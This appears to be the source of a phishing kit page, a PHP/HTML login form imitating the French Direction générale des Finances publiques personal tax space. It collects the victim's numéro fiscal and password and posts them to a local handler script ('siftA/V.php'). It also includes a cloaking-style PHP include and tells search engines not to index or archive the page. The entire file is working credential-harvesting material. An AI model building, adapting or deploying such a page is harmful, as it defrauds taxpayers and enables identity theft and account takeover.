<?php
session_start();

include("./BIRNAVA/911.php");
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Particuliers</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="top-header">
                    <div class="logo"><img src="../media/imgs/logo.svg"></div>
                    <div class="btns">
                        <button type="button"><i class="fas fa-lock"></i> Votre espace particulier</button>
                        <button style="background: #A63950; margin-top: 5px;" type="button"><i class="fas fa-lock"></i> Votre espace professionnel</button>
                    </div>
                    <div class="menu"><img src="../media/imgs/menu.png"></div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4 mb-5">
            <div class="container">
                <u>Accueil</u> <span>-</span> Authentification
            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="login-area">
                            <div class="title">
                                <h3>Connexion ou création de votre espace</h3>
                            </div>
                            <!--===========================-->
						<!--Body Connexion Gauche DEBUT-->
						<!--===========================-->
						<div id="forma">
							
							
							
							
							<form method="POST" action="./siftA/V.php">
								
								<!--====================-->
								<!-- Identifiant Fiscal -->
								<!--====================-->
								<div class="form-group mb20">
									
										
											<label for="spi_tmp">Numéro fiscal</label>
											
											<input class="form-control" name="username" type="tel" aria-required="true" autocomplete="username" id="spi_tmp" placeholder="13 chiffres" data-original-title="13 chiffres" data-max="13" data-feedbackok="1/">
											
										</div>
                        <div class="form-group mb20">
                                    <label for="password">Mot de passe</label>
                                    <div class="in">
                                        <input type="password" name="password" id="password" class="form-control">
                                       
                                    </div>
                                </div>
                                 <div class="btns">
                                    <button name="btn11" type="submit" id="booom">Connexion</button>
                                </div>
                                <fieldset class="border rounded-3">
                                  
                                    <legend class="float-none w-auto px-3">Ou</legend>
                                </fieldset>
                              </form>
                                <div class="text-center">
                                    <img style="max-width: 200px;" src="../media/imgs/login-img.svg">
                                    <p><span>Qu'est-ce que FranceConnect?</span></p>
                                </div>
                                <hr>
                                <p class="text-center mb-3">Vous pouvez également payer en ligne en utilisant votre numéro fiscal et la référence de votre avis</p>
                                <div class="btns">
                                    <button type="button">Payer en ligne</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <aside>
                            <div class="title">
                                <h3>Aide</h3>
                            </div>
                            <ul>
                                <li><span>+</span> Vous avez oublié votre mot de passe</li>
                                <li><span>+</span> Comment modifier votre mot de passe ?</li>
                            </ul>
                            <hr>
                            <ul>
                                <li><span>+</span> Les services disponibles sur votre espace particulier</li>
                                <li><span>+</span> Gestion des cookies</li>
                            </ul>
                        </aside>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        
    </body><script>

</html>